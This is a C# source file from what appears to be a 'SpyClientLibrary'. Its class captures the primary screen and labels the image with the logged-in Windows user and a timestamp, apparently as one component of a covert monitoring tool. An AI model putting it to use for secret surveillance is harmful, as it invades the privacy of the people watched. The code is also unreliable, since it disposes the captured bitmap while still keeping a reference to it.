using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Drawing;
using System.Windows.Forms;

namespace SpyClientLibrary
{
    public class ScreenShot
    {
        public Bitmap _currentScreen { get; set; }
        public DateTime _scrrenData { get; set; }
        public string _user { get; set; }
        public string _screenName { get; set; }

        public ScreenShot()
        {
            getWindowsUser();
        }

        public ScreenShot generateCurrentScreen()
        {
            _scrrenData = DateTime.Now;

            using (Bitmap bmpScreenCapture = new Bitmap(Screen.PrimaryScreen.Bounds.Width,
                                            Screen.PrimaryScreen.Bounds.Height))
            {
                using (Graphics g = Graphics.FromImage(bmpScreenCapture))
                {
                    g.CopyFromScreen(Screen.PrimaryScreen.Bounds.X,
                                     Screen.PrimaryScreen.Bounds.Y,
                                     0, 0,
                                     bmpScreenCapture.Size,
                                     CopyPixelOperation.SourceCopy);
                }
                _currentScreen = bmpScreenCapture;    
            }            
            createScreenName();
            return this;
        }

        private string createScreenName()
        {
            //FORMAT : username_YYYY_M_D_h_m.bmp
            _screenName = _user + "_" + 
                          _scrrenData.Year.ToString() + "_" +
                          _scrrenData.Month.ToString() +"_" +
                          _scrrenData.Day.ToString() + "_" +
                          _scrrenData.Hour.ToString() + "_" +
                          _scrrenData.Minute.ToString() + ".bmp";
            return _screenName;
        }
        private void getWindowsUser()
        {
            var computerName = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
            if (!string.IsNullOrEmpty(computerName))
                _user = computerName.Substring(computerName.IndexOf("\\")+1);
        }
    }
}
